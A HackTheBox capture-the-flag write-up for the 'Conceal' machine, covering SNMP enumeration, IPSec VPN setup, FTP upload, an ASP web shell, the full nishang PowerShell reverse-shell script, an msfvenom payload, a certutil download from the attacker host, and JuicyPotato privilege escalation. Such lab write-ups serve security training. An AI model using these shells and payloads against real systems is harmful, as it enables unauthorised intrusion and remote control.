Conceal is a **hard** machine from HackTheBox that covers enumeration of IKE protocol and Conceal configuring IPSec in transport mode, enumerating SNMP, file upload vulnerabilities and basic privilege escalation in Windows. We will see all the necessary steps to compromise the machine in this article.

# Enumeration

The first step is always to enumerate the machine. Our preferred tool for this is **nmap**, so let's run the following command  to see which TCP  ports are open using a TCP SYN scan:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn 10.129.228.122 -oG TcpPorts
```

![EmptyScan](/assets/images/hackthebox/conceal/EmptyScan.png)

Hmm... No TCP ports seem to be open. In this case we will try to check if any UDP ports are open:

```bash
sudo nmap -sU -p- --min-rate 10000 -vvv -n -Pn 10.129.228.122 -oG UdpPorts
```

![udpScan](/assets/images/hackthebox/conceal/udpScan.png)

Indeed some UDP ports are open. We see port 161 which corresponds to SNMP and port 500 which we can enumerate more to see exactly what it is been used for:

```bash
sudo nmap -p500 -sCVU --min-rate 10000 -n -Pn 10.129.228.122 -oN UdpInfo
```

![udpInfo](/assets/images/hackthebox/conceal/udpInfo.png)

IKE is running on this port which stands for  Internet Key Exchange and it is the protocol used to set up a security association in the IPsec protocol suite. Well with this new information we know that we are dealing with a VPN. At the moment we don't have any credentials to access it so we'll move on to enumerate SNMP first.


## SNMP

We can use nmap again to gain some information about the SNMP service:

```bash
sudo nmap -p161 -sCVU --min-rate 10000 -n -Pn 10.129.228.122
```

![snmpScan](/assets/images/hackthebox/conceal/snmpScan.png)

A lot of information is outputted, but one interesting bit information is the SNMP version. It is running SNMP version 1 which is an old version of SNMP that uses community strings (plaintext password) for authentication. There is a handy tool already installed in Kali called **onesixtyone** that can be used to bruteforce the community string. This tool already includes a default password list so we only need to specify the ip address as a parameter.

```bash
onesixtyone 10.129.228.122
```

![snmpPass](/assets/images/hackthebox/conceal/snmpPass.png)

The community string is "public". Now we can use **snmpwalk** to get more information from the SNMP service. This tool takes two parameters which are the community string and the SNMP version. After supplying this information, the tool will "walk" through the MIB (Management Information Base) which contains information about the monitored devices by the SNMP service. 

```bash
snmpwalk -c public -v1 10.129.228.122
```

![PSK](/assets/images/hackthebox/conceal/PSK.png)

Out of all the information, there is a line that stands out. It clearly contains a hashed password for the IKE VPN service we discovered earlier. Using [crackstation](https://crackstation.net/) we can quickly crack the hash.

![password](/assets/images/hackthebox/conceal/password.png)


## IKE VPN

In this section we will see how to configure a connection to the IKE VPN. To follow along you must have **strongswan** installed on your linux machine.


### Configure ipsec.secrets

The first step is to add the victim's IP Address and the password to the ipsec.secrets file that can be found in /etc/ipsec.secrets: 

```bash
# This file holds shared secrets or RSA private keys for authentication.

# RSA private key for this host, authenticating it to any other host
# which knows the public part.
10.129.228.122 : PSK "Dudecake1!" # can use %any instead of IP Address
```

This will allow you to authenticate to the VPN.


### Configure ipsec.conf

Next is the ipsec.conf file located in the /etc as well. Before configuring this file, we need to obtain the information about the IKE service we'll be using. The **ike-scan** tool can be used for this purpose: 

```bash
ike-scan -M 10.129.228.122
```

![ikeInfo](/assets/images/hackthebox/conceal/ikeInfo.png)

With this information we can specify a new connection called Conceal in the ipsec.conf file. I added information about each variable as a comment in the following configuration example:

```bash
conn Conceal
	type=transport # Specify host to host communication 
	keyexchange=ikev1 # IKE version
	right=10.129.228.122 # Victim IP
	authby=psk # Sepcify authentication type
	rightprotoport=tcp # Used to force TCP connection
	leftprotoport=tcp # Used to force TCP connection
	esp=3des-sha1 # Enc-Hash
	ike=3des-sha1-modp1024 # Enc-Hash-Group
	auto=start # auto start
```


Now we can connect to the IKE VPN service with the following command:

```bash
sudo ipsec start --nofork
```


## VPN Scan

We can try to scan TCP ports once again now that we are connected to the VPN. Just be aware that we must use a TCP connect scan to be able to detect the ports, a TCP SYN scan won't work in this case.

```bash
sudo nmap -p- -sT --open --min-rate 5000 -vvv -n -Pn ip -oG allPorts
```

![tcpScan](/assets/images/hackthebox/conceal/tcpScan.png)

Nice! finally we can se some TCP ports. Let's run some common nmap scripts on these ports:

```bash
sudo nmap -p21,80,135,139,445,49664,49665,49666,49668,49669,49670 -sCVT -Pn -n 10.129.228.122 -oN portsInfo
```

![tcpInfo](/assets/images/hackthebox/conceal/tcpInfo.png)

The victim has FTP with anonymous login enabled, this means that we can connect to the FTP service using "anonymous" as the user and an empty password. In this case there are no files but we do have permission to upload files. 

![ftpWrite](/assets/images/hackthebox/conceal/ftpWrite.png)

That's interesting, but we can't do anything with that right now. Let's see if there is anything interesting on the hosted website: 

![IIS](/assets/images/hackthebox/conceal/IIS.png)

It's just the classic IIS default page. Well we can try to fuzz the website with gobuster to check for hidden directories:

```bash
gobuster dir -u http://10.129.228.122/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 54
```

![gobuste](/assets/images/hackthebox/conceal/gobuster.png)

There's a directory called "upload". If we check it on our browser we can see the "portsInfo" file we uploaded to the FTP server earlier:

![upload](/assets/images/hackthebox/conceal/upload.png)


# Exploitation

Since the web server is running on IIS, it is safe to assume that it should interpret asp or aspx files. We can try to upload a malicious ASP file and the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) Invoke-PowerShellTcp.ps1 script to obtain a reverse shell. The ASP file will contain the following code:

```asp
<%
Set oWSH = Server.CreateObject("WScript.Shell")
Call oWSH.Run ("cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\upload\Invoke-PowerShellTcp.ps1", 0, True)
%>
```

And the nishang script will be the same as it is in the github repository but we will add an extra line at the the end to invoke the function immediately:

```powershell
function Invoke-PowerShellTcp 
{      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.188 -Port 443
```


After uploading both files and visiting http://10.129.228.122/uploads/shell.asp, we get a reverse shell:

![shell](/assets/images/hackthebox/conceal/shell.png)

# Privilege Escalation

Checking our privileges we can see that we have the SeImpersonatePrivilege:

![token](/assets/images/hackthebox/conceal/token.png)

This privilege can be easily exploited with [JuicyPotato](https://github.com/ohpe/juicy-potato) . We just need to check which Windows version is running to specify a correct [CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) 

![sysinfo](/assets/images/hackthebox/conceal/sysinfo.png)

By running the systeminfo command, we can see it is running Windows 10 Enterprise. Let's create a malicous executable with **msfvenom** as a payload for JuicyPotato

```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.188 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe
```

The executable can be uploaded to the victim machine by hosting a simple http server on your attacking machine and using certutil to download it.

```powershell
certutil -urlcache -split -f http://10.10.14.188/shell.exe shell.exe
```

Finally we execute JuicyPotato to obtain root privileges:

```powershell
./JuicyPotato.exe -t * -l 1337 -p C:\Users\Destitute\Desktop\shell.exe -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```
